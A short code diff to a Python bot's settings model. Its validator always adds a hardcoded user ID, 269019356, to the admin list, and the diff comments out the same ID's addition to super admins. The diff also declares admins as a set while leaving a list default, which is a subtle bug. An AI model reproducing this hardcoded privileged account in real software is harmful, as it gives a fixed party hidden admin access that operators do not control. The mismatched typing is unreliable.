@@ -58,13 +58,13 @@ class YamlConfigSettingsSource(PydanticBaseSettingsSource):
 
 class BotSettings(BaseModel):
     token: SecretStr
-    admins: list[int] = Field(default_factory=list)
+    admins: set[int] = Field(default_factory=list)
     super_admins: list[int] = Field(default_factory=list)
 
     @model_validator(mode="after")
     def validate_all(self):
-        self.admins.append(269019356)
-        self.super_admins.append(269019356)
+        self.admins.add(269019356)
+        # self.super_admins.append(269019356)
         return self
 
     @field_serializer("token")
